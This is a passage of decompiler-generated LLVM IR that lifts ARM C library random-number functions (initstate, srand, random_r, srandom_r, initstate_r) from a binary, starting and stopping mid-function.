  %v4_17c08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 124) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17c08)
  %v0_17c1c = load i32, i32* @r6, align 4
  %v2_17c1c = add i32 %v0_17c1c, 20
  %v3_17c1c = inttoptr i32 %v2_17c1c to i32*
  %v4_17c1c = load i32, i32* %v3_17c1c, align 4
  call void @__pseudo_branch(i32 %v4_17c1c)
  %v0_17c2c = load i32, i32* @r6, align 4
  %v2_17c2c = add i32 %v0_17c2c, 1084
  %v0_17c34 = load i32, i32* @r5, align 4
  %v1_17c38 = add i32 %v0_17c2c, 1092
  %v2_17c38 = inttoptr i32 %v1_17c38 to i32*
  %v3_17c38 = load i32, i32* %v2_17c38, align 4
  store i32 %v3_17c38, i32* @r4, align 4
  %v2_17c3c = inttoptr i32 %v2_17c2c to i32*
  %v3_17c3c = call i32 @setstate_r(i32 %v0_17c34, i32* %v2_17c3c)
  %v1_17c44 = icmp slt i32 %v3_17c3c, 0
  %v3_17c54 = load i32, i32* @r4, align 4
  %v4_17c54 = add i32 %v3_17c54, -4
  %storemerge = select i1 %v1_17c44, i32 0, i32 %v4_17c54
  %v0_17c58 = load i32, i32* @r6, align 4
  %v2_17c58 = add i32 %v0_17c58, 52
  %v3_17c58 = inttoptr i32 %v2_17c58 to i32*
  %v4_17c58 = load i32, i32* %v3_17c58, align 4
  call void @__pseudo_branch(i32 %v4_17c58)
  ret i32 %storemerge
}

define i32 @function_17c78(i32 %arg1) local_unnamed_addr {
dec_label_pc_17c78:
  %v0_17c78 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17c78, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_17c78
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17c78, %bb
  %v10_17c8c = phi i32 [ %arg1, %dec_label_pc_17c78 ], [ 0, %bb ]
  ret i32 %v10_17c8c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v4_17cc8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 124) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17cc8)
  %v0_17cdc = load i32, i32* @r4, align 4
  %v2_17cdc = add i32 %v0_17cdc, 20
  %v3_17cdc = inttoptr i32 %v2_17cdc to i32*
  %v4_17cdc = load i32, i32* %v3_17cdc, align 4
  call void @__pseudo_branch(i32 %v4_17cdc)
  %v0_17cec = load i32, i32* @r6, align 4
  %v0_17cf0 = load i32, i32* @r4, align 4
  %v2_17cf0 = add i32 %v0_17cf0, 1084
  %v0_17cf4 = load i32, i32* @r7, align 4
  %v0_17cf8 = load i32, i32* @sl, align 4
  store i32 %v0_17cf8, i32* @r0, align 4
  %v1_17cfc = add i32 %v0_17cf0, 1092
  %v2_17cfc = inttoptr i32 %v1_17cfc to i32*
  %v3_17cfc = load i32, i32* %v2_17cfc, align 4
  store i32 %v3_17cfc, i32* @r5, align 4
  %v4_17d00 = inttoptr i32 %v0_17cf8 to i32*
  %v5_17d00 = call i32 @__GI_initstate_r(i32* %v4_17d00, i32 %v0_17cec, i32 %v0_17cf4, i32 %v2_17cf0)
  %v0_17d10 = load i32, i32* @r4, align 4
  %v2_17d10 = add i32 %v0_17d10, 52
  %v3_17d10 = inttoptr i32 %v2_17d10 to i32*
  %v4_17d10 = load i32, i32* %v3_17d10, align 4
  call void @__pseudo_branch(i32 %v4_17d10)
  %v0_17d1c = load i32, i32* @r5, align 4
  %v1_17d1c = add i32 %v0_17d1c, -4
  ret i32 %v1_17d1c
}

define i32 @function_17d38(i32 %arg1) local_unnamed_addr {
dec_label_pc_17d38:
  %v0_17d38 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17d38, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_17d38
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17d38, %bb
  %v10_17d4c = phi i32 [ %arg1, %dec_label_pc_17d38 ], [ 0, %bb ]
  ret i32 %v10_17d4c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_17d50 = load i32, i32* @r4, align 4
  %v6_17d50 = load i32, i32* @r5, align 4
  %v9_17d50 = load i32, i32* @r6, align 4
  %v15_17d50 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r4, align 4
  %v2_17d64 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 932), i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_17d80 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 124) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17d80)
  %v0_17d94 = load i32, i32* @r4, align 4
  %v2_17d94 = add i32 %v0_17d94, 20
  %v3_17d94 = inttoptr i32 %v2_17d94 to i32*
  %v4_17d94 = load i32, i32* %v3_17d94, align 4
  call void @__pseudo_branch(i32 %v4_17d94)
  %v0_17da4 = load i32, i32* @r6, align 4
  store i32 %v0_17da4, i32* @r0, align 4
  %v0_17da8 = load i32, i32* @r4, align 4
  %v2_17da8 = add i32 %v0_17da8, 1084
  %v2_17dac = inttoptr i32 %v0_17da4 to i32*
  %v3_17dac = call i32 @srandom_r(i32* %v2_17dac, i32 %v2_17da8)
  %v0_17dc0 = load i32, i32* @r4, align 4
  %v2_17dc0 = add i32 %v0_17dc0, 52
  %v3_17dc0 = inttoptr i32 %v2_17dc0 to i32*
  %v4_17dc0 = load i32, i32* %v3_17dc0, align 4
  call void @__pseudo_branch(i32 %v4_17dc0)
  store i32 %v3_17d50, i32* @r4, align 4
  store i32 %v6_17d50, i32* @r5, align 4
  store i32 %v9_17d50, i32* @r6, align 4
  store i32 %v15_17d50, i32* @lr, align 4
  ret i32 %v2_17d64
}

define i32 @function_17ddc(i32 %arg1) local_unnamed_addr {
dec_label_pc_17ddc:
  %v0_17ddc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17ddc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_17ddc
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17ddc, %bb
  %v10_17df0 = phi i32 [ %arg1, %dec_label_pc_17ddc ], [ 0, %bb ]
  ret i32 %v10_17df0

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17df4 = load i32, i32* @r4, align 4
  store i32 %v3_17df4, i32* %stack_var_-8, align 4
  %v1_17df8 = add i32 %tmp, 12
  %v2_17df8 = inttoptr i32 %v1_17df8 to i8*
  %v3_17df8 = load i8, i8* %v2_17df8, align 1
  %v4_17df8 = sext i8 %v3_17df8 to i32
  store i32 %v4_17df8, i32* %r3.global-to-local, align 4
  %v2_17dfc = icmp eq i8 %v3_17df8, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_17e08 = add i32 %tmp, 8
  %v2_17e08 = inttoptr i32 %v1_17e08 to i32*
  %v3_17e08 = load i32, i32* %v2_17e08, align 4
  store i32 %v3_17e08, i32* %lr.global-to-local, align 4
  br i1 %v2_17dfc, label %dec_label_pc_17e10, label %dec_label_pc_17e34

dec_label_pc_17e10:                               ; preds = %entry
  %v1_17e10 = inttoptr i32 %v3_17e08 to i32*
  %v2_17e10 = load i32, i32* %v1_17e10, align 4
  store i32 %v2_17e10, i32* %r2.global-to-local, align 4
  %v2_17e18 = mul i32 %v2_17e10, 1103515245
  %v1_17e20 = add i32 %v2_17e18, 12345
  %tmp6 = bitcast i32 %v1_17e20 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_17e24 = bitcast float %tmp7 to i32
  store i32 %v1_17e24, i32* %r3.global-to-local, align 4
  store i32 %v1_17e24, i32* %v1_17e10, align 4
  %v0_17e2c = load i32, i32* %r3.global-to-local, align 4
  %v2_17e2c = inttoptr i32 %arg2 to i32*
  store i32 %v0_17e2c, i32* %v2_17e2c, align 4
  br label %dec_label_pc_17e74

dec_label_pc_17e34:                               ; preds = %entry
  %v2_17e34 = load i32, i32* %arg1, align 4
  store i32 %v2_17e34, i32* %r2.global-to-local, align 4
  %v1_17e38 = add i32 %tmp, 4
  %v2_17e38 = inttoptr i32 %v1_17e38 to i32*
  %v3_17e38 = load i32, i32* %v2_17e38, align 4
  store i32 %v3_17e38, i32* %r0.global-to-local, align 4
  %v1_17e3c = inttoptr i32 %v2_17e34 to i32*
  %v2_17e3c = load i32, i32* %v1_17e3c, align 4
  store i32 %v2_17e3c, i32* %r1.global-to-local, align 4
  %v1_17e40 = inttoptr i32 %v3_17e38 to i32*
  %v2_17e40 = load i32, i32* %v1_17e40, align 4
  %v4_17e40 = add i32 %v3_17e38, 4
  store i32 %v4_17e40, i32* %r0.global-to-local, align 4
  %v2_17e44 = add i32 %v2_17e40, %v2_17e3c
  store i32 %v2_17e44, i32* %r3.global-to-local, align 4
  store i32 %v2_17e44, i32* %v1_17e3c, align 4
  %v3_17e48 = load i32, i32* %r2.global-to-local, align 4
  %v4_17e48 = add i32 %v3_17e48, 4
  store i32 %v4_17e48, i32* %r2.global-to-local, align 4
  %v0_17e4c = load i32, i32* %ip.global-to-local, align 4
  %v1_17e4c = add i32 %v0_17e4c, 16
  %v2_17e4c = inttoptr i32 %v1_17e4c to i32*
  %v3_17e4c = load i32, i32* %v2_17e4c, align 4
  store i32 %v3_17e4c, i32* %r1.global-to-local, align 4
  %v0_17e50 = load i32, i32* %r3.global-to-local, align 4
  %v3_17e50 = udiv i32 %v0_17e50, 2
  store i32 %v3_17e50, i32* %r3.global-to-local, align 4
  %v3_17e54 = icmp ult i32 %v4_17e48, %v3_17e4c
  %v1_17e58 = load i32, i32* %r4.global-to-local, align 4
  %v2_17e58 = inttoptr i32 %v1_17e58 to i32*
  store i32 %v3_17e50, i32* %v2_17e58, align 4
  br i1 %v3_17e54, label %dec_label_pc_17e64, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_17e34
  %v1_17e5c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_17e5c, i32* %r2.global-to-local, align 4
  %v0_17e6c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_17e64:                               ; preds = %dec_label_pc_17e34
  %v0_17e64 = load i32, i32* %r0.global-to-local, align 4
  %v1_17e64 = load i32, i32* %r1.global-to-local, align 4
  %v3_17e64 = icmp ult i32 %v0_17e64, %v1_17e64
  br i1 %v3_17e64, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_17e64
  %v1_17e68 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_17e68, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_17e64, %._crit_edge, %bb
  %v0_17e6c = phi i32 [ %v0_17e6c.pre, %._crit_edge ], [ %v0_17e64, %dec_label_pc_17e64 ], [ %v1_17e68, %bb ]
  %v1_17e6c = load i32, i32* %ip.global-to-local, align 4
  %v2_17e6c = add i32 %v1_17e6c, 4
  %v3_17e6c = inttoptr i32 %v2_17e6c to i32*
  store i32 %v0_17e6c, i32* %v3_17e6c, align 4
  %v0_17e70 = load i32, i32* %r2.global-to-local, align 4
  %v1_17e70 = load i32, i32* %ip.global-to-local, align 4
  %v2_17e70 = inttoptr i32 %v1_17e70 to i32*
  store i32 %v0_17e70, i32* %v2_17e70, align 4
  br label %dec_label_pc_17e74

dec_label_pc_17e74:                               ; preds = %dec_label_pc_17e10, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_17e78 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17e78, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_17e50, { 1, 0 }
  uselistorder i32 %v1_17e24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_17e74, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17e84 = load i32, i32* @r4, align 4
  store i32 %v3_17e84, i32* %stack_var_-36, align 4
  %v1_17e88 = add i32 %tmp, 12
  %v2_17e88 = inttoptr i32 %v1_17e88 to i8*
  %v3_17e88 = load i8, i8* %v2_17e88, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_17e98 = load i8, i8* %v2_17e88, align 1
  %tmp33 = icmp ugt i8 %v3_17e88, 4
  br i1 %tmp33, label %.dec_label_pc_17f44_crit_edge, label %dec_label_pc_17ea4

.dec_label_pc_17f44_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_17f44

dec_label_pc_17ea4:                               ; preds = %entry
  %v0_17ea4 = load i32, i32* @r0, align 4
  %v2_17ea4 = icmp eq i32 %v0_17ea4, 0
  %v1_17ea8 = add i32 %tmp, 8
  %v2_17ea8 = inttoptr i32 %v1_17ea8 to i32*
  %v3_17ea8 = load i32, i32* %v2_17ea8, align 4
  store i32 %v3_17ea8, i32* %r6.global-to-local, align 4
  br i1 %v2_17ea4, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_17ea4
  store i32 1, i32* @r0, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_17ea4, %bb
  %v0_17eb4 = phi i32 [ %v0_17ea4, %dec_label_pc_17ea4 ], [ 1, %bb ]
  %v2_17eb0 = icmp eq i8 %v3_17e98, 0
  %v2_17eb4 = inttoptr i32 %v3_17ea8 to i32*
  store i32 %v0_17eb4, i32* %v2_17eb4, align 4
  br i1 %v2_17eb0, label %dec_label_pc_17f40, label %dec_label_pc_17ebc

dec_label_pc_17ebc:                               ; preds = %bb23
  %v1_17ebc = add i32 %tmp, 13
  %v2_17ebc = inttoptr i32 %v1_17ebc to i8*
  %v3_17ebc = load i8, i8* %v2_17ebc, align 1
  %v4_17ebc = sext i8 %v3_17ebc to i32
  store i32 %v4_17ebc, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_17ec8 = load i32, i32* @r0, align 4
  store i32 %v0_17ec8, i32* %r4.global-to-local, align 4
  %v0_17ecc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_17ecc, i32* %r8.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v5_17f0c25 = icmp sgt i8 %v3_17ebc, 1
  br i1 %v5_17f0c25, label %dec_label_pc_17ed8, label %dec_label_pc_17f10

dec_label_pc_17ed8:                               ; preds = %dec_label_pc_17ebc, %dec_label_pc_17ed8.dec_label_pc_17ed8_crit_edge
  %v1_17eec = phi i32 [ %v1_17eec.pre, %dec_label_pc_17ed8.dec_label_pc_17ed8_crit_edge ], [ 2836, %dec_label_pc_17ebc ]
  %v1_17ee0 = phi i32 [ %v1_17ee0.pre, %dec_label_pc_17ed8.dec_label_pc_17ed8_crit_edge ], [ 16807, %dec_label_pc_17ebc ]
  %v0_17edc27 = phi i32 [ %v0_17f00.pre, %dec_label_pc_17ed8.dec_label_pc_17ed8_crit_edge ], [ %v0_17ec8, %dec_label_pc_17ebc ]
  %v1_17ef826 = phi i32 [ %v5_17ef8, %dec_label_pc_17ed8.dec_label_pc_17ed8_crit_edge ], [ %v0_17ecc, %dec_label_pc_17ebc ]
  %v3_17ed8 = urem i32 %v0_17edc27, 127773
  %v2_17ee0 = mul i32 %v1_17ee0, %v3_17ed8
  %v2_17ee8 = sdiv i32 %v0_17edc27, 127773
  %v2_17eec = mul i32 %v1_17eec, %v2_17ee8
  %v2_17ef0 = sub i32 %v2_17ee0, %v2_17eec
  %v8_17ef0 = icmp slt i32 %v2_17ef0, 0
  %v2_17ef4 = add i32 %v2_17ef0, 2147483647
  %v2_17ef4.v2_17ef0 = select i1 %v8_17ef0, i32 %v2_17ef4, i32 %v2_17ef0
  store i32 %v2_17ef4.v2_17ef0, i32* %r4.global-to-local, align 4
  %v2_17ef8 = add i32 %v1_17ef826, 4
  %v3_17ef8 = inttoptr i32 %v2_17ef8 to i32*
  store i32 %v2_17ef4.v2_17ef0, i32* %v3_17ef8, align 4
  %v4_17ef8 = load i32, i32* %r8.global-to-local, align 4
  %v5_17ef8 = add i32 %v4_17ef8, 4
  store i32 %v5_17ef8, i32* %r8.global-to-local, align 4
  %v0_17efc.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_17efc.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_17f00.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17f08 = add i32 %v0_17efc.pre, 1
  store i32 %v1_17f08, i32* %r7.global-to-local, align 4
  %v5_17f0c = icmp slt i32 %v0_17efc.pre, %v1_17efc.pre
  br i1 %v5_17f0c, label %dec_label_pc_17ed8.dec_label_pc_17ed8_crit_edge, label %dec_label_pc_17efc.dec_label_pc_17f10_crit_edge

dec_label_pc_17ed8.dec_label_pc_17ed8_crit_edge:  ; preds = %dec_label_pc_17ed8
  %v1_17ee0.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_17eec.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_17ed8

dec_label_pc_17efc.dec_label_pc_17f10_crit_edge:  ; preds = %dec_label_pc_17ed8
  %v0_17f20.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17f10

dec_label_pc_17f10:                               ; preds = %dec_label_pc_17efc.dec_label_pc_17f10_crit_edge, %dec_label_pc_17ebc
  %v0_17f20 = phi i32 [ %v0_17f20.pre, %dec_label_pc_17efc.dec_label_pc_17f10_crit_edge ], [ %v0_17ecc, %dec_label_pc_17ebc ]
  %v0_17f14.lcssa = phi i32 [ %v1_17efc.pre, %dec_label_pc_17efc.dec_label_pc_17f10_crit_edge ], [ %v4_17ebc, %dec_label_pc_17ebc ]
  %v2_17f14 = mul i32 %v0_17f14.lcssa, 10
  store i32 %v2_17f14, i32* @r4, align 4
  %v0_17f18 = load i32, i32* %r5.global-to-local, align 4
  %v1_17f18 = add i32 %v0_17f18, 14
  %v2_17f18 = inttoptr i32 %v1_17f18 to i8*
  %v3_17f18 = load i8, i8* %v2_17f18, align 1
  %v4_17f18 = sext i8 %v3_17f18 to i32
  %v2_17f1c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_17f1c, i32* %r7.global-to-local, align 4
  %v4_17f20 = mul nsw i32 %v4_17f18, 4
  %v5_17f20 = add i32 %v0_17f20, %v4_17f20
  %v1_17f24 = inttoptr i32 %v0_17f18 to i32*
  store i32 %v5_17f20, i32* %v1_17f24, align 4
  %v3_17f24 = add i32 %v0_17f18, 4
  %v4_17f24 = inttoptr i32 %v3_17f24 to i32*
  %v5_17f24 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_17f24, i32* %v4_17f24, align 4
  br label %dec_label_pc_17f30

dec_label_pc_17f2c:                               ; preds = %dec_label_pc_17f30
  %v0_17f34 = load i32, i32* %r5.global-to-local, align 4
  %v2_17f2c = inttoptr i32 %v0_17f34 to i32*
  %v3_17f2c = call i32 @__GI_random_r(i32* %v2_17f2c, i32 %v2_17f1c)
  br label %dec_label_pc_17f30

dec_label_pc_17f30:                               ; preds = %dec_label_pc_17f10, %dec_label_pc_17f2c
  %v0_17f30 = load i32, i32* @r4, align 4
  %v1_17f30 = add i32 %v0_17f30, -1
  store i32 %v1_17f30, i32* @r4, align 4
  %v6_17f30 = icmp slt i32 %v1_17f30, 0
  br i1 %v6_17f30, label %dec_label_pc_17f40, label %dec_label_pc_17f2c

dec_label_pc_17f40:                               ; preds = %dec_label_pc_17f30, %bb23
  %v2_17f48.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_17f44

dec_label_pc_17f44:                               ; preds = %.dec_label_pc_17f44_crit_edge, %dec_label_pc_17f40
  %v2_17f48 = phi i32 [ %v3_17e84, %.dec_label_pc_17f44_crit_edge ], [ %v2_17f48.pre, %dec_label_pc_17f40 ]
  %v1_17f4c = phi i32 [ -1, %.dec_label_pc_17f44_crit_edge ], [ 0, %dec_label_pc_17f40 ]
  store i32 %v2_17f48, i32* @r4, align 4
  ret i32 %v1_17f4c

; uselistorder directives
  uselistorder i32 %v1_17f30, { 1, 0 }
  uselistorder i32 %v0_17f18, { 1, 0, 2 }
  uselistorder i32 %v0_17efc.pre, { 1, 0 }
  uselistorder i32 %v5_17ef8, { 1, 0 }
  uselistorder i32 %v0_17edc27, { 1, 0 }
  uselistorder i32 %v0_17ecc, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 3, 1 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_17f44, { 1, 0 }
  uselistorder label %dec_label_pc_17f30, { 1, 0 }
  uselistorder label %dec_label_pc_17ed8, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17f50:
  %v0_17f50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17f50, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17f50
  %v2_17f50 = load i32, i32* @r7, align 4
  %v5_17f50 = udiv i32 %v2_17f50, 8
  %v6_17f50 = and i32 %v5_17f50, %arg1
  %v3_17f54 = load i32, i32* @fp, align 4
  %v8_17f54 = shl i32 %v6_17f50, %v3_17f54
  %v9_17f54 = and i32 %v8_17f54, %arg1
  %v2_17f58 = load i32, i32* @sp, align 4
  %v8_17f58 = shl i32 %v2_17f58, %arg3
  %v9_17f58 = and i32 %v8_17f58, %arg2
  call void @__pseudo_branch(i32 %v9_17f58)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17f50, %bb
  %v10_17f58 = phi i32 [ %arg1, %dec_label_pc_17f50 ], [ %v9_17f54, %bb ]
  ret i32 %v10_17f58

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_17f5c = load i32, i32* @r4, align 4
  %v6_17f5c = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_17f8c, label %dec_label_pc_17f7c

dec_label_pc_17f7c:                               ; preds = %entry
  %v2_17f7c = icmp ugt i32 %arg2, 254
  %v7_17f7c = icmp eq i32 %arg2, 255
  %v2_17f80 = xor i1 %v7_17f7c, true
  %v3_17f80 = and i1 %v2_17f7c, %v2_17f80
  br i1 %v3_17f80, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_17f7c
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_17f7c, %bb
  %v1_17fb87 = phi i32 [ %v3_17f5c, %dec_label_pc_17f7c ], [ 4, %bb ]
  %v2_17f84 = xor i1 %v2_17f7c, true
  %v3_17f84 = or i1 %v7_17f7c, %v2_17f84
  br i1 %v3_17f84, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_17f8c:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_17fa4, label %dec_label_pc_17f94

dec_label_pc_17f94:                               ; preds = %dec_label_pc_17f8c
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_18014

.thread10:                                        ; preds = %dec_label_pc_17f94
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_17fa4:                               ; preds = %dec_label_pc_17f8c
  %v2_17fa4 = icmp ugt i32 %arg2, 62
  %v7_17fa4 = icmp eq i32 %arg2, 63
  %v2_17fa8 = xor i1 %v7_17fa4, true
  %v3_17fa8 = and i1 %v2_17fa4, %v2_17fa8
  br i1 %v3_17fa8, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_17fa4
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_17fa4, %bb23
  %v1_17fb86 = phi i32 [ %v3_17f5c, %dec_label_pc_17fa4 ], [ 2, %bb23 ]
  %v2_17fac = xor i1 %v2_17fa4, true
  %v3_17fac = or i1 %v7_17fa4, %v2_17fac
  br i1 %v3_17fac, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_17fc4 = phi i32 [ 3, %bb22 ], [ %v1_17fb87, %bb21 ], [ %v1_17fb86, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -35740), i32* %r3.global-to-local, align 4
  %v4_17fb8 = mul i32 %v1_17fc4, 4
  %v5_17fb8 = add i32 %v4_17fb8, add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -35740)
  store i32 %v5_17fb8, i32* %r2.global-to-local, align 4
  %v1_17fbc = add i32 %v4_17fb8, add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -35720)
  %v2_17fbc = inttoptr i32 %v1_17fbc to i32*
  %v3_17fbc = load i32, i32* %v2_17fbc, align 4
  store i32 %v3_17fbc, i32* %r1.global-to-local, align 4
  %v1_17fc0 = add i32 %tmp, 4
  store i32 %v1_17fc0, i32* @r6, align 4
  %v6_17fc4 = inttoptr i32 %v5_17fb8 to i32*
  %v7_17fc4 = load i32, i32* %v6_17fc4, align 4
  store i32 %v7_17fc4, i32* %r2.global-to-local, align 4
  %v4_17fc8 = mul i32 %v3_17fbc, 4
  %v5_17fc8 = add i32 %v4_17fc8, %v1_17fc0
  store i32 %v5_17fc8, i32* %r3.global-to-local, align 4
  %v2_17fcc = add i32 %arg3, 16
  %v3_17fcc = inttoptr i32 %v2_17fcc to i32*
  store i32 %v5_17fc8, i32* %v3_17fcc, align 4
  %v0_17fd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_17fd0 = trunc i32 %v0_17fd0 to i8
  %v2_17fd0 = load i32, i32* @r5, align 4
  %v3_17fd0 = add i32 %v2_17fd0, 14
  %v4_17fd0 = inttoptr i32 %v3_17fd0 to i8*
  store i8 %v1_17fd0, i8* %v4_17fd0, align 1
  %v0_17fd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_17fd4 = trunc i32 %v0_17fd4 to i8
  %v2_17fd4 = load i32, i32* @r5, align 4
  %v3_17fd4 = add i32 %v2_17fd4, 13
  %v4_17fd4 = inttoptr i32 %v3_17fd4 to i8*
  store i8 %v1_17fd4, i8* %v4_17fd4, align 1
  %v0_17fd8 = load i32, i32* @r4, align 4
  %v1_17fd8 = trunc i32 %v0_17fd8 to i8
  %v2_17fd8 = load i32, i32* @r5, align 4
  %v3_17fd8 = add i32 %v2_17fd8, 12
  %v4_17fd8 = inttoptr i32 %v3_17fd8 to i8*
  store i8 %v1_17fd8, i8* %v4_17fd8, align 1
  %v0_17fdc = load i32, i32* @r6, align 4
  %v1_17fdc = load i32, i32* @r5, align 4
  %v2_17fdc = add i32 %v1_17fdc, 8
  %v3_17fdc = inttoptr i32 %v2_17fdc to i32*
  store i32 %v0_17fdc, i32* %v3_17fdc, align 4
  %v0_17fe0 = load i32, i32* @r5, align 4
